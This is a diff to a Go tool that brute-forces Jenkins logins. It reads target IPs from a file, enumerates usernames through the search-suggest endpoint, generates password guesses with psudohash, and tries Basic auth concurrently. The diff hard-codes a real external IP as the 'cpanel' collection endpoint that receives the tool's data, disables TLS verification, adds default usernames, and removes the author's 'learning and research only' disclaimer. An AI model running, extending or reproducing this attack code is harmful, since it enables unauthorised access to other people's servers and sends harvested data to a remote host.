@@ -4,6 +4,7 @@ import (
 	"bufio"
 	"bytes"
 	"context"
+	"crypto/tls"
 	"encoding/base64"
 	"encoding/json"
 	"errors"
@@ -63,19 +64,24 @@ func countTotalNoOfIP(ipFile string) error {
 	return nil
 }
 
-var hostCpanel = "enter your host here"
+var hostCpanel = "https://185.186.25.117/panel"
 
 func sendDataToCpanel() {
 
 	payload, _ := json.Marshal(Data)
 	req, _ := http.NewRequest(http.MethodPost, hostCpanel, bytes.NewReader(payload))
 	req.Header.Set("Content-Type", "application/json")
-	http.DefaultClient.Do(req)
+	httpClient.Do(req)
 
 }
 
 var httpClient = &http.Client{
 	Timeout: 5 * time.Second,
+	Transport: &http.Transport{
+		TLSClientConfig: &tls.Config{
+			InsecureSkipVerify: true,
+		},
+	},
 }
 
 func checkJenkinsCreds(ctx context.Context, input IpUserPass) error {
@@ -83,7 +89,6 @@ func checkJenkinsCreds(ctx context.Context, input IpUserPass) error {
 	if err != nil {
 		return err
 	}
-
 	auth := base64.StdEncoding.EncodeToString([]byte(input.User + ":" + input.Password))
 	req.Header.Set("Authorization", "Basic "+auth)
 	req.Header.Set("User-Agent", "Go-http-client")
@@ -153,7 +158,7 @@ func saveResults(IP, Username, Password string) error {
 }
 
 func generatePasswords(parlai, urlai string, ctx context.Context) <-chan string {
-	cmd := exec.Command("./psudohash.py", "-w", urlai, "-o", parlai)
+	cmd := exec.CommandContext(ctx, "./psudohash.sh", "-w", urlai, "-o", parlai)
 	err := cmd.Run()
 
 	if err != nil {
@@ -207,13 +212,14 @@ func generateRandomNumber() int {
 	return rng.Intn(100000)
 }
 
-func processCredsForIP(ip string, workers int) error {
-	users, err := ExtractingUser(ip)
+func processCredsForIP(parentCtx context.Context, ip string, workers int) error {
+	users, err := ExtractingUser(parentCtx, ip)
 	if err != nil {
-		return fmt.Errorf("error extracting users for IP %s: %v", ip, err)
+		fmt.Printf("Skipping IP %s due to ExtractingUser error: %v\n", ip, err)
+		return nil
 	}
 
-	ctx, cancel := context.WithCancel(context.Background())
+	ctx, cancel := context.WithCancel(parentCtx)
 	defer cancel()
 
 	jobs := make(chan IpUserPass, workers*600)
@@ -260,7 +266,6 @@ forLoop:
 	for _, user := range users {
 		randomNumber := strconv.Itoa(generateRandomNumber())
 		sendDataToCpanel()
-		fmt.Println("Current:", user)
 		userFile := fmt.Sprintf("%s", user)
 
 		passwordFile := fmt.Sprintf("%s_password.txt", randomNumber)
@@ -302,7 +307,7 @@ forLoop:
 	}
 }
 
-func scanIPsFromFile(ipFile string, ipWorkers int, processCredsForIP func(ip string, workers int) error) error {
+func scanIPsFromFile(ctxMenu context.Context, ipFile string, ipWorkers int, processCredsForIP func(ctx context.Context, ip string, workers int) error) error {
 	f, err := os.Open(ipFile)
 	if err != nil {
 		return err
@@ -312,7 +317,7 @@ func scanIPsFromFile(ipFile string, ipWorkers int, processCredsForIP func(ip str
 	ipJobs := make(chan IPandThreads, ipWorkers*2)
 	errCh := make(chan error, 1)
 
-	ctx, cancel := context.WithCancel(context.Background())
+	ctx, cancel := context.WithCancel(ctxMenu)
 	defer cancel()
 
 	var wg sync.WaitGroup
@@ -329,7 +334,7 @@ func scanIPsFromFile(ipFile string, ipWorkers int, processCredsForIP func(ip str
 					if !ok {
 						return
 					}
-					if err := processCredsForIP(ipData.IP, ipData.Threads); err != nil {
+					if err := processCredsForIP(ctx, ipData.IP, ipData.Threads); err != nil {
 						select {
 						case errCh <- fmt.Errorf("ip worker %d (%s): %w", workerID, ipData.IP, err):
 						default:
@@ -399,15 +404,14 @@ type SearchResult struct {
 	Suggestions []Suggestion `json:"suggestions"`
 }
 
-func ExtractingUser(input string) ([]string, error) {
-	req, err := http.NewRequest("GET", input+"/search/suggest?query", nil)
+func ExtractingUser(ctx context.Context, input string) ([]string, error) {
+	req, err := http.NewRequestWithContext(ctx, "GET", input+"/search/suggest?query", nil)
 	if err != nil {
 		return nil, fmt.Errorf("error creating request: %v", err)
 	}
 	req.Header.Set("User-Agent", "Go-http-client")
 
-	client := &http.Client{}
-	resp, err := client.Do(req)
+	resp, err := httpClient.Do(req)
 	if err != nil {
 		return nil, fmt.Errorf("error making request: %v", err)
 	}
@@ -416,6 +420,9 @@ func ExtractingUser(input string) ([]string, error) {
 	body, err := io.ReadAll(resp.Body)
 	if err != nil {
 		return nil, fmt.Errorf("error reading response body: %v", err)
+	}
+	if resp.StatusCode == http.StatusForbidden {
+		return []string{"admin", "user"}, nil
 	}
 	if resp.StatusCode == http.StatusOK {
 		var result SearchResult
@@ -432,7 +439,7 @@ func ExtractingUser(input string) ([]string, error) {
 			}
 		}
 		if len(userIDs) == 0 {
-			userIDs = append(userIDs, "admin")
+			userIDs = append(userIDs, "admin", "user")
 		}
 		return userIDs, nil
 	} else {
@@ -441,24 +448,16 @@ func ExtractingUser(input string) ([]string, error) {
 }
 
 func main() {
-	ipWorkers := 4 // Number of concurrent IP processing workers
+	countTotalNoOfIP("ips.txt")
+	ipWorkers := 8
 
-	processCredsForIP := func(ip string, workers int) error {
-		return processCredsForIP(ip, workers)
+	processFunc := func(ctx context.Context, ip string, workers int) error {
+		return processCredsForIP(ctx, ip, workers)
 	}
-
-	err := scanIPsFromFile("ips.txt", ipWorkers, processCredsForIP)
-
-	if err != nil {
-		fmt.Println("Error:", err)
+	fmt.Println("scan started")
+	if err := scanIPsFromFile(context.Background(), "ips.txt", ipWorkers, processFunc); err != nil {
+		fmt.Println("scan error:", err)
+	} else {
+		fmt.Println("scan finished")
 	}
-
-	/*
-	   Disclaimer: This project was created for learning and research purposes only.
-	   Using this application against systems you do not own or do not have explicit
-	   permission to test may be illegal and could lead to legal consequences. The
-	   author and maintainer do not take any responsibility or liability for misuse
-	   of this code. Use responsibly and only on systems where you have permission.
-	*/
-
 }
